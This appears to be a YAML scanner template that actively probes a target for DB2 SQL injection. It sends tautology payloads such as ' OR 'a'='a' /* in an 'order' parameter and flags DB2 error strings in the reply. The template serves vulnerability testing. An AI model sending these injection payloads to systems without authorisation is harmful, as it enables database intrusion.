id: sqli6-db2-29
name: 'SQLi db2 probe in order'
severity: high
type: active
tags:
  - sqli
  - injection
  - db2
description: 'Triggers db2 error via order'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      order:
        - ''' OR ''a''=''a'' /*'
        - '` OR `1`=`1'
    matchers:
      - type: regex
        part: body
        regex:
          - 'SQLCODE'
          - 'DB2'
